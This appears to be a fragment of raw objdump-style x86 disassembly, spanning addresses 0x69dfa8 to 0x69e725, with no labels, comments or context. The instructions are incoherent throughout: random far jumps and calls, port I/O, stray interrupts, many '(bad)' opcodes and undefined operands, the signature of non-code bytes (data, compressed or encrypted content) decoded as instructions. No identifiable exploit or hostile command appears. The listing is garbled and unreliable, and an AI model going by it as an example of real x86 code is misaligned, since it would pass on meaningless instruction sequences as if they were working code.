  69dfa8:	xchg   esp,eax
  69dfa9:	mov    bh,0xff
  69dfab:	shl    DWORD PTR [ebx-0x11],0x6
  69dfaf:	add    eax,0x9ce217a9
  69dfb4:	mov    al,ds:0xb6f79068
  69dfb9:	addr16 mov edi,0xb52c86a2
  69dfbf:	sub    bh,BYTE PTR [ebx]
  69dfc1:	add    al,0x22
  69dfc3:	aas    
  69dfc4:	out    dx,al
  69dfc5:	inc    eax
  69dfc6:	xor    eax,0x31d7418
  69dfcb:	in     eax,dx
  69dfcc:	int    0xe1
  69dfce:	mov    ebx,0xea9b7500
  69dfd3:	xchg   esp,eax
  69dfd4:	scas   al,BYTE PTR es:[edi]
  69dfd5:	paddq  mm6,mm5
  69dfd8:	push   0x38d65e35
  69dfdd:	pusha  
  69dfde:	ret    0x7d55
  69dfe1:	ret    
  69dfe2:	and    bl,dh
  69dfe4:	mov    cs,WORD PTR ds:0x8c38c5b2
  69dfea:	not    DWORD PTR [edi]
  69dfec:	int    0xb5
  69dfee:	add    ebp,DWORD PTR [ebp-0x48]
  69dff1:	add    ecx,edx
  69dff3:	mov    bl,0x13
  69dff5:	sub    DWORD PTR [edx],ecx
  69dff7:	aaa    
  69dff8:	jae    0x69e006
  69dffa:	xlat   BYTE PTR ds:[ebx]
  69dffb:	sub    BYTE PTR [edx+0x5],bl
  69dffe:	das    
  69dfff:	pop    ebx
  69e000:	sar    DWORD PTR ss:[ebp+0x2efa6dbf],cl
  69e007:	fild   DWORD PTR [edx-0x31]
  69e00a:	sti    
  69e00b:	ja     0x69e03c
  69e00d:	mov    ecx,0x765a3c00
  69e012:	pusha  
  69e013:	mov    eax,ds:0xb3915af9
  69e018:	xchg   DWORD PTR [esi-0x49],ebp
  69e01b:	xchg   ecx,eax
  69e01c:	or     DWORD PTR [edx-0x5e],0xfffffff4
  69e020:	fstp   TBYTE PTR [eax-0x640e692e]
  69e026:	inc    ebp
  69e027:	cmp    esp,DWORD PTR [edi]
  69e029:	adc    al,0xe0
  69e02b:	add    edx,DWORD PTR [esi+eax*8-0x755278da]
  69e032:	cwde   
  69e033:	push   dx
  69e035:	jge    0x69e048
  69e037:	adc    esp,ebx
  69e039:	jnp    0x69e09e
  69e03b:	stos   DWORD PTR es:[edi],eax
  69e03c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  69e03d:	inc    ebx
  69e03e:	xor    eax,DWORD PTR [ebx+0x31]
  69e041:	jmp    0x9abb:0x682decd3
  69e048:	int3   
  69e049:	and    BYTE PTR [eax+0x52136fac],bl
  69e04f:	dec    esp
  69e050:	lahf   
  69e051:	adc    edi,DWORD PTR [edx-0x48]
  69e054:	in     al,0xc3
  69e056:	ficom  DWORD PTR [ebp+ebx*4-0x63]
  69e05a:	fwait
  69e05b:	jle    0x69e056
  69e05d:	int    0x13
  69e05f:	dec    esi
  69e060:	mov    ecx,0xc808b191
  69e065:	div    BYTE PTR [esi-0x7c]
  69e068:	inc    eax
  69e069:	or     DWORD PTR [ebp+esi*1-0x78a8efab],eax
  69e070:	sti    
  69e071:	mov    bh,0x4c
  69e073:	imul   edx,ecx,0x57
  69e076:	test   eax,0x43a2dad2
  69e07b:	pop    ecx
  69e07c:	outs   dx,DWORD PTR ds:[esi]
  69e07d:	push   es
  69e07e:	mov    dl,0xfd
  69e080:	retf   
  69e081:	daa    
  69e082:	add    al,0xa4
  69e084:	sub    DWORD PTR [ebp+ebp*1-0x4933b3d3],esp
  69e08b:	mov    esp,0x84a9c842
  69e090:	pop    esi
  69e091:	cmp    BYTE PTR [esi-0x25],0x9e
  69e095:	stos   DWORD PTR es:[edi],eax
  69e096:	xor    DWORD PTR es:[ecx-0x35],edx
  69e09a:	mov    edx,0xe1f96337
  69e09f:	ffreep st(3)
  69e0a1:	pusha  
  69e0a2:	mov    WORD PTR [edx],?
  69e0a4:	cdq    
  69e0a5:	or     al,0x8a
  69e0a7:	in     al,dx
  69e0a8:	xchg   ebx,eax
  69e0a9:	sbb    dh,cl
  69e0ab:	ret    0xd578
  69e0ae:	push   ds
  69e0af:	pop    esp
  69e0b0:	mov    eax,ds:0xaa65bedd
  69e0b5:	add    eax,0x901bcea2
  69e0ba:	aam    0x11
  69e0bc:	dec    edx
  69e0bd:	fs pop ds
  69e0bf:	cmp    DWORD PTR [ecx+ebp*8],edx
  69e0c2:	arpl   WORD PTR [eax+0x258a2c72],cx
  69e0c8:	mov    al,ds:0xec30da7
  69e0cd:	mov    eax,0x815033b6
  69e0d2:	lods   eax,DWORD PTR ds:[esi]
  69e0d3:	cld    
  69e0d4:	lds    ebx,FWORD PTR ds:0x31e49bf1
  69e0da:	test   eax,0xa631d884
  69e0df:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  69e0e0:	sbb    esp,DWORD PTR [edx]
  69e0e2:	pop    ebx
  69e0e3:	into   
  69e0e4:	out    0x56,al
  69e0e6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  69e0e7:	imul   esp,DWORD PTR [ebx],0x7102dbf1
  69e0ed:	mov    ah,0xf3
  69e0ef:	xor    al,BYTE PTR [esi]
  69e0f1:	pop    ss
  69e0f2:	add    bh,al
  69e0f4:	out    dx,eax
  69e0f5:	pushf  
  69e0f6:	popa   
  69e0f7:	les    edx,FWORD PTR [ebp+0x7e]
  69e0fa:	enter  0xa98d,0x41
  69e0fe:	movzx  ebx,BYTE PTR [ecx+ebx*1-0x3f]
  69e103:	jg     0x69e097
  69e105:	sti    
  69e106:	jmp    0xa81a:0x61dbc081
  69e10d:	(bad)  
  69e10e:	mov    ch,0x81
  69e110:	mov    al,0x3d
  69e112:	add    BYTE PTR [ebp+esi*8+0x33],bh
  69e116:	add    BYTE PTR [ebp+ebp*8+0x1],dh
  69e11a:	rol    DWORD PTR [ecx-0x38],1
  69e11d:	out    dx,al
  69e11e:	sbb    al,0xb0
  69e120:	idiv   dh
  69e122:	sub    al,0x22
  69e124:	pop    edi
  69e125:	sbb    eax,0x9bee359d
  69e12a:	(bad)  
  69e12b:	push   edi
  69e12c:	adc    eax,0x36a3e2f0
  69e131:	rcr    DWORD PTR [esi*4+0x43ee39ae],0x99
  69e139:	xchg   ecx,eax
  69e13a:	ds data16 jecxz 0x69e14c
  69e13e:	ret    0x1fe0
  69e141:	push   ebp
  69e142:	jbe    0x69e1b8
  69e144:	mov    ds:0x5994c2e8,al
  69e149:	pop    ecx
  69e14a:	or     esp,DWORD PTR [esi+esi*2-0x7550b53d]
  69e151:	int3   
  69e152:	ror    DWORD PTR [esi],cl
  69e154:	xor    al,0x2b
  69e156:	cmp    DWORD PTR [ebx+0x730b61e7],ebp
  69e15c:	push   edx
  69e15d:	lds    edx,FWORD PTR [edx+0x58]
  69e160:	stc    
  69e161:	les    ebx,FWORD PTR [ebp-0x26]
  69e164:	xchg   ecx,eax
  69e165:	je     0x69e191
  69e167:	or     DWORD PTR [ecx],0xb80c301c
  69e16d:	push   edi
  69e16e:	popa   
  69e16f:	xrelease mov DWORD PTR [edi+0x7bb4495c],ebx
  69e176:	push   ebx
  69e177:	adc    eax,DWORD PTR [esi-0x49]
  69e17a:	enter  0x49ac,0x93
  69e17e:	out    0x8f,eax
  69e180:	ret    0x61fa
  69e183:	outs   dx,BYTE PTR ds:[esi]
  69e184:	outs   dx,BYTE PTR ds:[esi]
  69e185:	scas   al,BYTE PTR es:[edi]
  69e186:	lds    ebp,FWORD PTR [eax+0x7ef4cf2d]
  69e18c:	ins    DWORD PTR es:[edi],dx
  69e18d:	adc    al,0x27
  69e18f:	ss inc ebp
  69e191:	enter  0xa8e6,0x3f
  69e195:	aaa    
  69e196:	js     0x69e180
  69e198:	push   ebx
  69e199:	(bad)  
  69e19b:	push   cs
  69e19c:	push   eax
  69e19d:	and    DWORD PTR [edx-0x7d],esp
  69e1a0:	pop    esp
  69e1a1:	sub    ebp,DWORD PTR [edx+0x3759daf6]
  69e1a7:	push   0xffffff8b
  69e1a9:	jmp    0x69e14c
  69e1ab:	pusha  
  69e1ac:	xor    ch,BYTE PTR cs:0x3d066f2b
  69e1b3:	sub    edx,edi
  69e1b5:	xchg   bh,dl
  69e1b7:	(bad)  
  69e1b8:	es jns 0x69e197
  69e1bb:	jg     0x69e184
  69e1bd:	clc    
  69e1be:	dec    edx
  69e1bf:	aaa    
  69e1c0:	retf   
  69e1c1:	int    0x94
  69e1c3:	call   0xef77df80
  69e1c8:	and    BYTE PTR [ecx+0x2e1f4fb8],dh
  69e1ce:	jmp    0x69e22d
  69e1d0:	ins    BYTE PTR es:[edi],dx
  69e1d1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  69e1d2:	mov    cl,0x87
  69e1d4:	out    dx,al
  69e1d5:	mov    bh,0x4
  69e1d7:	mov    ah,0x24
  69e1d9:	pop    esp
  69e1da:	(bad)  
  69e1db:	rcr    BYTE PTR [eax-0x78605764],0xae
  69e1e2:	rcl    DWORD PTR [esi],0x93
  69e1e5:	mov    eax,0xf1b50a8e
  69e1ea:	pushf  
  69e1eb:	mov    ss,WORD PTR [eax+esi*8]
  69e1ee:	cmc    
  69e1ef:	cs test dh,bl
  69e1f2:	test   al,0xc
  69e1f4:	jl     0x69e245
  69e1f6:	xchg   DWORD PTR [ebx],edi
  69e1f8:	fcmovnu st,st(2)
  69e1fa:	scas   eax,DWORD PTR es:[edi]
  69e1fb:	or     esp,DWORD PTR [edx]
  69e1fd:	fimul  DWORD PTR [edi+ebp*1]
  69e200:	jnp    0x69e195
  69e202:	icebp  
  69e203:	add    edx,DWORD PTR [edi]
  69e205:	cmp    BYTE PTR [edi+0x51],dh
  69e208:	cmc    
  69e209:	sbb    edx,DWORD PTR [edx]
  69e20b:	cmp    al,0xd3
  69e20d:	aaa    
  69e20e:	sbb    ecx,eax
  69e210:	mov    dh,0x2
  69e212:	xchg   esi,eax
  69e213:	xor    ah,cl
  69e215:	cld    
  69e216:	and    bl,dl
  69e218:	jo     0x69e1d4
  69e21a:	(bad)  
  69e21b:	iret   
  69e21c:	retf   
  69e21d:	inc    ebp
  69e21e:	lods   eax,DWORD PTR ds:[esi]
  69e21f:	or     al,0x54
  69e221:	js     0x69e209
  69e223:	hlt    
  69e224:	cli    
  69e225:	ror    DWORD PTR [eax],0x99
  69e228:	into   
  69e229:	loope  0x69e234
  69e22b:	mov    ss,WORD PTR [ebp-0x5b]
  69e22e:	jno    0x69e20f
  69e230:	neg    BYTE PTR [edx+0x3d]
  69e233:	xchg   esp,eax
  69e234:	or     al,bl
  69e236:	pop    eax
  69e237:	mov    ebx,DWORD PTR [eax-0x12]
  69e23a:	mov    esi,0x8d3aff9f
  69e23f:	xchg   esi,eax
  69e240:	and    al,0xaa
  69e242:	pop    ecx
  69e243:	xor    ebx,ebp
  69e245:	loop   0x69e23c
  69e247:	mov    dh,0x8d
  69e249:	fcom   DWORD PTR ds:0xc898a011
  69e24f:	call   0x52202096
  69e254:	add    ch,BYTE PTR [ecx+eax*2-0x34ae562b]
  69e25b:	(bad)  
  69e25c:	repz mov edx,0xfc8542af
  69e262:	add    dh,BYTE PTR [ebx+0x6022573c]
  69e268:	mov    DWORD PTR [edi],edx
  69e26a:	je     0x69e241
  69e26c:	rcr    BYTE PTR [edx+0x4e2bd1d8],cl
  69e272:	jmp    DWORD PTR [eax+0x47]
  69e275:	dec    eax
  69e276:	int3   
  69e277:	xor    ax,0xde5b
  69e27b:	pop    esi
  69e27c:	icebp  
  69e27d:	or     BYTE PTR [eax+0x2ecd4a62],dl
  69e283:	retf   
  69e284:	enter  0xe54f,0x6b
  69e288:	lahf   
  69e289:	scas   eax,DWORD PTR es:[edi]
  69e28a:	iret   
  69e28b:	ins    BYTE PTR es:[edi],dx
  69e28c:	ins    BYTE PTR es:[edi],dx
  69e28d:	dec    esi
  69e28e:	or     cl,BYTE PTR [esi+0x53]
  69e291:	imul   ebp,DWORD PTR [ebp+esi*2-0x6008372b],0xe577b17
  69e29c:	mov    esp,0x2d917ec7
  69e2a1:	fwait
  69e2a2:	jnp    0x69e2bf
  69e2a4:	js     0x69e2c7
  69e2a6:	mov    bl,0x7b
  69e2a8:	or     ecx,DWORD PTR [ecx+0x2be49687]
  69e2ae:	push   cs
  69e2af:	inc    ebp
  69e2b0:	cwde   
  69e2b1:	cmp    edx,DWORD PTR [esi-0x61a79891]
  69e2b7:	leave  
  69e2b8:	pop    ebp
  69e2b9:	push   0xffffffce
  69e2bb:	popf   
  69e2bc:	sub    BYTE PTR [eax-0x5bf7cdb9],bl
  69e2c2:	imul   BYTE PTR [esp+ebx*4+0x3]
  69e2c6:	cmp    DWORD PTR [eax+0x28054321],0x874382c7
  69e2d0:	ror    dh,1
  69e2d2:	mov    ds:0xaaf0622d,al
  69e2d7:	imul   esi,edx,0x7c20844c
  69e2dd:	xor    dl,bh
  69e2df:	stos   DWORD PTR es:[edi],eax
  69e2e0:	popf   
  69e2e1:	ss int 0xe9
  69e2e4:	call   0xb53becb2
  69e2e9:	inc    ebx
  69e2ea:	fld    QWORD PTR [ebx-0x3d]
  69e2ed:	sbb    BYTE PTR fs:[edx-0x15],bh
  69e2f1:	inc    ebp
  69e2f2:	ins    DWORD PTR es:[edi],dx
  69e2f3:	push   0xf4a58756
  69e2f8:	mov    edi,0x5b37f493
  69e2fd:	cmp    BYTE PTR [ebx-0x50056453],bh
  69e303:	dec    esp
  69e304:	push   ecx
  69e305:	push   eax
  69e306:	cld    
  69e307:	push   ebp
  69e308:	ret    
  69e309:	mov    bl,0x4f
  69e30b:	jl     0x69e2ad
  69e30d:	rol    BYTE PTR [edi],1
  69e30f:	sbb    BYTE PTR [edi-0x37],dl
  69e312:	pop    esp
  69e313:	mov    dh,0x3b
  69e315:	fsubr  st,st(2)
  69e317:	adc    al,0x20
  69e319:	test   BYTE PTR [edx-0x3ee4441],bl
  69e31f:	dec    esp
  69e320:	push   ebp
  69e321:	pop    ds
  69e322:	in     al,dx
  69e323:	mov    DWORD PTR [esi+0x5dbcfa6],edx
  69e329:	xchg   edx,eax
  69e32a:	stc    
  69e32b:	sbb    dl,BYTE PTR [ebx+0x33]
  69e32e:	aas    
  69e32f:	fist   WORD PTR [esi+0x5f]
  69e332:	dec    eax
  69e333:	jge    0x69e307
  69e335:	ds adc eax,0x265dcdc7
  69e33b:	mov    ebx,0xa0403b2e
  69e340:	pop    es
  69e341:	shl    DWORD PTR [eax+edx*8+0x501bf3d4],0x1b
  69e349:	xlat   BYTE PTR ds:[ebx]
  69e34a:	jae    0x69e345
  69e34c:	imul   ebp,DWORD PTR [ebx+0x821fc2d],0xffffff93
  69e353:	and    ebp,DWORD PTR [ecx+0x59]
  69e356:	jbe    0x69e390
  69e358:	sahf   
  69e359:	(bad)  
  69e35b:	or     al,0xcd
  69e35d:	pop    esi
  69e35e:	mov    cl,0x1f
  69e360:	mov    al,0xc4
  69e362:	popf   
  69e363:	icebp  
  69e364:	in     eax,0xb3
  69e366:	clc    
  69e367:	pop    ecx
  69e368:	adc    ebx,edi
  69e36a:	call   0xaa9d:0xc9d17fd
  69e371:	jae    0x69e389
  69e373:	jecxz  0x69e35f
  69e375:	(bad)  
  69e376:	pop    ss
  69e377:	pop    ss
  69e378:	mov    dl,0xe6
  69e37a:	jl     0x69e38e
  69e37c:	popf   
  69e37d:	mov    es,WORD PTR [eax]
  69e37f:	xor    eax,0x6c24253f
  69e384:	sbb    DWORD PTR [ebx],edi
  69e386:	out    dx,al
  69e387:	inc    edi
  69e388:	jne    0x69e36e
  69e38a:	xchg   ebx,eax
  69e38b:	scas   al,BYTE PTR es:[edi]
  69e38c:	xor    al,0x40
  69e38e:	lds    ecx,FWORD PTR [edi]
  69e390:	in     eax,dx
  69e391:	or     edx,0xe8d27f03
  69e397:	and    al,dh
  69e399:	lds    eax,FWORD PTR [edi+0x58]
  69e39c:	les    ebx,FWORD PTR [edx+0x77de9940]
  69e3a2:	ja     0x69e3ce
  69e3a4:	dec    edi
  69e3a5:	aad    0x1c
  69e3a7:	mov    al,ds:0xaee26f5
  69e3ac:	enter  0x2b20,0xf7
  69e3b0:	aas    
  69e3b1:	(bad)  
  69e3b2:	mov    edx,0xd3bc6788
  69e3b7:	inc    edx
  69e3b8:	test   al,0x24
  69e3ba:	in     al,0xb9
  69e3bc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  69e3bd:	dec    esp
  69e3be:	fwait
  69e3bf:	add    DWORD PTR [ecx+0x50],esp
  69e3c2:	inc    ecx
  69e3c3:	std    
  69e3c4:	push   ebp
  69e3c5:	push   cs
  69e3c6:	in     eax,dx
  69e3c7:	in     eax,0x93
  69e3c9:	cmp    edx,DWORD PTR [ebp-0x69de4cf6]
  69e3cf:	mov    esi,0x2e5556e9
  69e3d4:	and    DWORD PTR ds:0x704b7b20,esi
  69e3da:	ins    DWORD PTR es:[edi],dx
  69e3db:	into   
  69e3dc:	push   esi
  69e3dd:	cmp    DWORD PTR [ebp+eiz*2-0x60],edx
  69e3e1:	jmp    0x69e3fd
  69e3e3:	jmp    0xf473:0x706b8cdd
  69e3ea:	aas    
  69e3eb:	lods   eax,DWORD PTR ds:[esi]
  69e3ec:	mov    edx,0xb6d5ed77
  69e3f1:	sti    
  69e3f2:	push   cs
  69e3f3:	and    eax,DWORD PTR [edi-0x5]
  69e3f6:	lahf   
  69e3f7:	xchg   ecx,eax
  69e3f8:	add    BYTE PTR [ebp+0x76],0xb3
  69e3fc:	rcr    DWORD PTR cs:[ecx],cl
  69e3ff:	add    DWORD PTR [eax+0x70],edx
  69e402:	lahf   
  69e403:	mov    DWORD PTR [ecx],0x67ebab89
  69e409:	stc    
  69e40a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  69e40b:	retf   0xa3da
  69e40e:	nop
  69e40f:	out    dx,eax
  69e410:	mov    ebp,0xd6c34577
  69e415:	mov    eax,0x5d5f413d
  69e41a:	call   0x3fbe:0x3303505e
  69e421:	and    esp,DWORD PTR [esi-0x304e3cbd]
  69e427:	in     eax,dx
  69e428:	add    al,0x82
  69e42a:	es ret 
  69e42c:	nop
  69e42d:	ds retf 0x6305
  69e431:	cmp    ebx,esp
  69e433:	in     al,dx
  69e434:	push   edx
  69e435:	sahf   
  69e436:	jb     0x69e441
  69e438:	sub    DWORD PTR [ebx+edx*2-0x25145e11],eax
  69e43f:	scas   eax,DWORD PTR es:[edi]
  69e440:	jb     0x69e422
  69e442:	imul   edx,DWORD PTR [edx+0x48],0xffffffac
  69e446:	push   ecx
  69e447:	push   cs
  69e448:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  69e449:	jne    0x69e4bb
  69e44b:	dec    edi
  69e44c:	inc    edx
  69e44d:	sub    cl,BYTE PTR [esp+esi*1-0x25]
  69e451:	adc    al,0x29
  69e453:	sbb    eax,0x64c4a2a8
  69e458:	jne    0x69e3e1
  69e45a:	(bad)  
  69e45b:	or     al,0xd8
  69e45d:	sub    BYTE PTR [ebx-0x56],cl
  69e460:	into   
  69e461:	add    DWORD PTR [esi+0x7b],ebx
  69e464:	mov    ah,0xb8
  69e466:	lods   eax,DWORD PTR ds:[esi]
  69e467:	jb     0x69e4ac
  69e469:	xor    ecx,DWORD PTR [ebp-0x42b56a81]
  69e46f:	shl    eax,1
  69e471:	mov    ebp,0x5962bd04
  69e476:	icebp  
  69e477:	ds mov esi,0x22fcb404
  69e47d:	push   ecx
  69e47e:	es push eax
  69e480:	jmp    0xe062:0xd74d6c94
  69e487:	push   edi
  69e488:	call   0x87d0:0x39a3d804
  69e48f:	ja     0x69e4b8
  69e491:	dec    ebx
  69e492:	ds loope 0x69e462
  69e495:	in     al,dx
  69e496:	rcr    esi,0x5f
  69e499:	test   eax,0xf8973691
  69e49e:	sub    DWORD PTR [edx+0x11],esi
  69e4a1:	jnp    0x69e4a1
  69e4a3:	call   FWORD PTR [esi-0x1fa71b39]
  69e4a9:	mov    al,ds:0x1b007d4d
  69e4ae:	repnz cmps DWORD PTR ds:[esi],DWORD PTR es:[edi]
  69e4b0:	fs in  eax,dx
  69e4b2:	xor    esi,DWORD PTR [ebx]
  69e4b4:	and    ah,bh
  69e4b6:	cs aad 0x67
  69e4b9:	fcmovnbe st,st(1)
  69e4bb:	imul   DWORD PTR [ecx-0x6b]
  69e4be:	pop    edx
  69e4bf:	repnz sbb al,0x9d
  69e4c2:	push   eax
  69e4c3:	retf   0x4b8a
  69e4c6:	xchg   BYTE PTR [esi-0x5a],al
  69e4c9:	mov    eax,ds:0x2d88a0c2
  69e4ce:	iret   
  69e4cf:	xchg   ecx,eax
  69e4d0:	in     eax,dx
  69e4d1:	push   0x68405136
  69e4d6:	dec    edx
  69e4d7:	ret    
  69e4d8:	cli    
  69e4d9:	sbb    BYTE PTR [esi+edi*8+0x7c],al
  69e4dd:	pop    ebp
  69e4de:	dec    ebx
  69e4df:	test   DWORD PTR [edx-0x5450c805],esi
  69e4e5:	enter  0x558e,0x94
  69e4e9:	dec    ecx
  69e4ea:	add    ebx,DWORD PTR [ecx-0x6b9a549e]
  69e4f0:	push   ecx
  69e4f1:	push   ds
  69e4f2:	mov    eax,0xefe23e2e
  69e4f7:	cmp    ebp,DWORD PTR [ecx]
  69e4f9:	and    BYTE PTR [edx+edx*8+0x205987c1],dh
  69e500:	pop    ds
  69e501:	sub    al,0x76
  69e503:	adc    al,0xcf
  69e505:	inc    ecx
  69e506:	adc    eax,0x544085b8
  69e50b:	les    esp,FWORD PTR [edi-0x36c35478]
  69e511:	fwait
  69e512:	outs   dx,DWORD PTR ds:[esi]
  69e513:	add    bh,bl
  69e515:	pusha  
  69e516:	loopne 0x69e4e6
  69e518:	sahf   
  69e519:	push   edi
  69e51a:	jbe    0x69e4cc
  69e51c:	push   cs
  69e51d:	pop    ebp
  69e51e:	mov    edi,0xdafd0343
  69e523:	or     BYTE PTR [ebp+0x37],cl
  69e526:	imul   ebx,DWORD PTR [edx+0x39863cdd],0xffffff90
  69e52d:	dec    edx
  69e52e:	mov    cl,0x6a
  69e530:	push   esi
  69e531:	cmc    
  69e532:	mov    al,ds:0x7065c21b
  69e537:	bound  ecx,QWORD PTR [eax]
  69e539:	mov    ds:0xd702826a,al
  69e53e:	jle    0x69e4dd
  69e540:	std    
  69e541:	add    DWORD PTR [ecx+0x77],eax
  69e544:	sub    DWORD PTR [edi-0x39],esp
  69e547:	mov    bh,0x63
  69e54a:	idiv   ebx
  69e54c:	in     al,dx
  69e54d:	jo     0x69e4d4
  69e54f:	and    bl,bh
  69e551:	in     eax,0x2
  69e553:	fmul   DWORD PTR [ecx-0x4a3ebd72]
  69e559:	ficomp DWORD PTR [esi+0x70daa25e]
  69e55f:	mov    eax,ds:0xaf839e07
  69e564:	arpl   WORD PTR [edx-0x4b],bx
  69e567:	xchg   esp,eax
  69e568:	ja     0x69e4f7
  69e56a:	xor    al,0xad
  69e56c:	gs das 
  69e56e:	and    al,0xbc
  69e570:	cmc    
  69e571:	add    BYTE PTR [ecx],dl
  69e573:	cmp    esi,DWORD PTR [ecx-0x5f17dc03]
  69e579:	ds mov edi,0x644b95f1
  69e57f:	lods   al,BYTE PTR ds:[esi]
  69e580:	iret   
  69e581:	pop    ebx
  69e582:	clc    
  69e583:	xchg   bl,dl
  69e585:	mov    edx,0xadf0099d
  69e58a:	ja     0x69e580
  69e58c:	xchg   DWORD PTR [edi+0x23],ecx
  69e58f:	inc    esi
  69e590:	or     al,BYTE PTR [ebx+0x58]
  69e593:	add    BYTE PTR [ebp-0x5e],0xc4
  69e597:	mov    esi,?
  69e599:	mov    BYTE PTR [esi+0x26adf4a1],ah
  69e59f:	not    edi
  69e5a1:	mov    es,ebp
  69e5a3:	add    esp,DWORD PTR [edi-0x50]
  69e5a6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  69e5a7:	arpl   WORD PTR [ebx+0x68b16f61],di
  69e5ad:	outs   dx,DWORD PTR ds:[esi]
  69e5ae:	xor    dl,cl
  69e5b0:	adc    al,0x3a
  69e5b2:	push   ecx
  69e5b3:	push   edi
  69e5b4:	in     al,0x8b
  69e5b6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  69e5b7:	es int 0x37
  69e5ba:	mov    ds:0x80c3a036,al
  69e5bf:	xchg   ecx,eax
  69e5c0:	fst    DWORD PTR [esi-0x18f33ae2]
  69e5c6:	inc    esi
  69e5c7:	jge    0x69e555
  69e5c9:	inc    esi
  69e5ca:	not    DWORD PTR [ebp+0x1a]
  69e5cd:	ins    BYTE PTR es:[edi],dx
  69e5ce:	out    0x57,al
  69e5d0:	lods   eax,DWORD PTR ds:[esi]
  69e5d1:	pop    esp
  69e5d2:	xchg   esi,eax
  69e5d3:	shl    BYTE PTR [ecx+0x250e068d],0x4f
  69e5da:	ja     0x69e652
  69e5dc:	adc    DWORD PTR [eax+0x19174cdf],esi
  69e5e2:	fcom   DWORD PTR [esi-0x5a]
  69e5e5:	push   edx
  69e5e6:	push   0xf7f2aff
  69e5eb:	mov    eax,ds:0xf036903d
  69e5f0:	pop    esp
  69e5f1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  69e5f2:	and    BYTE PTR [edx+0x28e57e10],0x7e
  69e5f9:	in     al,dx
  69e5fa:	rcl    BYTE PTR [eax],0xcd
  69e5fd:	mov    esp,0xa5aec995
  69e602:	aas    
  69e603:	rol    bh,1
  69e605:	lods   eax,DWORD PTR ds:[esi]
  69e606:	outs   dx,DWORD PTR ds:[esi]
  69e607:	ret    
  69e608:	lock dec esp
  69e60a:	dec    edi
  69e60b:	clc    
  69e60c:	int    0x6
  69e60e:	dec    esp
  69e60f:	inc    edi
  69e610:	in     al,0x1
  69e612:	(bad)  
  69e613:	push   esi
  69e614:	lahf   
  69e615:	lock mov bh,0xc5
  69e618:	jmp    0xa744fc40
  69e61d:	out    0xb9,al
  69e61f:	jge    0x69e5a3
  69e621:	and    esi,esp
  69e623:	out    0x18,eax
  69e625:	in     al,dx
  69e626:	lds    ecx,FWORD PTR [edx+0x43b7722e]
  69e62c:	ins    DWORD PTR es:[edi],dx
  69e62d:	rcr    esi,cl
  69e62f:	pop    es
  69e630:	dec    esi
  69e631:	icebp  
  69e632:	jae    0x69e6ad
  69e634:	enter  0x58da,0x20
  69e638:	inc    edx
  69e639:	sub    ch,BYTE PTR [edi-0x7e766dc0]
  69e63f:	repnz push cs
  69e641:	mov    cl,0xb5
  69e643:	mov    ebx,0x551a517
  69e648:	lds    ebp,FWORD PTR [di-0x424f]
  69e64d:	jns    0x69e5e3
  69e64f:	(bad)  
  69e650:	pop    ebx
  69e651:	iret   
  69e652:	shr    DWORD PTR [ebp-0x30c1ce17],0x82
  69e659:	fisub  DWORD PTR [edi]
  69e65b:	retf   
  69e65c:	xchg   ebp,eax
  69e65d:	int    0xae
  69e65f:	add    BYTE PTR [edi],ch
  69e661:	jae    0x69e6ba
  69e663:	stc    
  69e664:	jmp    0x6218:0x9cf7dbfc
  69e66b:	adc    dh,al
  69e66d:	jns    0x69e6c2
  69e66f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  69e670:	xor    eax,0x9cc7c14d
  69e675:	lds    ebp,FWORD PTR [ebx+0x6a]
  69e678:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  69e679:	push   esi
  69e67a:	sub    DWORD PTR [eax+ecx*2+0x2a867c67],esi
  69e681:	jle    0x69e605
  69e683:	iret   
  69e684:	inc    ecx
  69e685:	adc    dh,BYTE PTR [ebx]
  69e687:	imul   edi,DWORD PTR [esi-0x38],0xffffffe6
  69e68b:	xchg   esp,eax
  69e68c:	out    dx,eax
  69e68d:	mov    dl,0xc6
  69e68f:	mov    edi,0x44f9a91
  69e694:	sbb    edx,ebp
  69e696:	and    edi,eax
  69e698:	je     0x69e65d
  69e69a:	shl    ebp,cl
  69e69c:	retf   0xbce3
  69e69f:	aaa    
  69e6a0:	push   ecx
  69e6a1:	ret    0xfc8a
  69e6a4:	adc    eax,0x8b53fa3f
  69e6a9:	jg     0x69e663
  69e6ab:	xchg   esp,eax
  69e6ac:	mov    ebp,0x887a2787
  69e6b1:	mov    edx,0xb809981d
  69e6b6:	sbb    ebx,DWORD PTR [esi]
  69e6b8:	(bad)  
  69e6b9:	sbb    eax,0x992503a8
  69e6be:	mov    ecx,0xfbd5b1e1
  69e6c3:	mov    BYTE PTR [eax-0x37097114],dh
  69e6c9:	mov    ds:0xa23b317b,eax
  69e6ce:	imul   esp,esi,0x28e43d7e
  69e6d4:	in     al,dx
  69e6d5:	pusha  
  69e6d6:	data16 jge 0x69e72f
  69e6d9:	pop    ds
  69e6da:	gs stos BYTE PTR es:[edi],al
  69e6dc:	das    
  69e6dd:	cmc    
  69e6de:	outs   dx,BYTE PTR ds:[esi]
  69e6df:	loope  0x69e6c8
  69e6e1:	mov    esp,0xce29c4a6
  69e6e6:	iret   
  69e6e7:	(bad)  
  69e6e9:	cmp    al,0xef
  69e6eb:	adc    eax,0xaaf75af4
  69e6f1:	mov    esi,0x3c00f9d3
  69e6f6:	adc    DWORD PTR [eax-0xda6ee60],edx
  69e6fc:	cmp    BYTE PTR [edi-0x65],cl
  69e6ff:	cld    
  69e700:	inc    ebx
  69e701:	inc    BYTE PTR [esi-0x75]
  69e704:	lahf   
  69e705:	cmp    dh,BYTE PTR [ecx+0x50]
  69e708:	shl    esp,0xa3
  69e70b:	mov    cl,cl
  69e70d:	mov    edx,0xd48f3bfb
  69e712:	dec    ebx
  69e713:	adc    ah,bl
  69e715:	ins    DWORD PTR es:[edi],dx
  69e716:	fwait
  69e717:	repnz mov esp,0xd97e3d18
  69e71d:	mov    dl,0x18
  69e71f:	xor    BYTE PTR [ebx-0x60ffbfb7],cl
  69e725:	inc    ecx
